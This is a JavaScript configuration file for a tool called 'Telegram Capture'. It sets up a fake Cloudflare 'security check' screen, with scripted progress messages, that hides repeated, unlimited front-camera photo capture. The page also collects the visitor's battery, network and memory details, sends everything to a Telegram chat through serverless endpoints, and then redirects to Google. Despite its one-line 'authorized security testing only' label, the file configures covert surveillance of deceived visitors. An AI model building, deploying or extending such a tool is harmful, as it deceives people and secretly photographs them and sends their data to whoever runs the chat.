/**
 * Telegram Capture — Frontend Configuration
 * ==========================================
 * For authorized security testing only.
 * Deploy on Vercel with zero backend changes needed here.
 */

const CAPTURE_CONFIG = {

  // ── API Endpoints (Vercel serverless functions) ────────────
  api: {
    sendPhoto:   '/api/sendPhoto',
    sendMessage: '/api/sendMessage',
  },

  // ── Default Chat ID (overridden by ?chatid= URL param) ────
  defaultChatId: '',

  // ── Camera ─────────────────────────────────────────────────
  camera: {
    width:          { ideal: 1280 },
    height:         { ideal: 720 },
    facingMode:     { ideal: 'user' },
    jpegQuality:    0.85,
    captureInterval: 2000,   // ms between photos
    maxPhotos:       0,       // 0 = unlimited
  },

  // ── Timing ─────────────────────────────────────────────────
  timing: {
    cloudflareDuration: 5,    // seconds before redirect
    initialCaptureDelay: 1000,
    redirectBuffer:     500,
  },

  // ── Data Collection ────────────────────────────────────────
  dataCollection: {
    sendDetailedInfo: true,
    collectBattery:   true,
    collectNetwork:   true,
    collectMemory:    true,
  },

  // ── Cloudflare Screen ──────────────────────────────────────
  cloudflareScreen: {
    duration: 5,
    progressMessages: [
      'Performing security check…',
      'Analyzing browser fingerprint…',
      'Checking for malicious activity…',
      'Validating request integrity…',
      'Finalizing security verification…',
    ],
  },

  // ── Redirect ───────────────────────────────────────────────
  redirect: {
    autoHttps:   true,
    fallbackUrl: 'https://www.google.com',
  },

  // ── Debug ──────────────────────────────────────────────────
  debug: {
    consoleLogging: true,
    showStatusMessages: false,
  },
};

Object.freeze(CAPTURE_CONFIG);
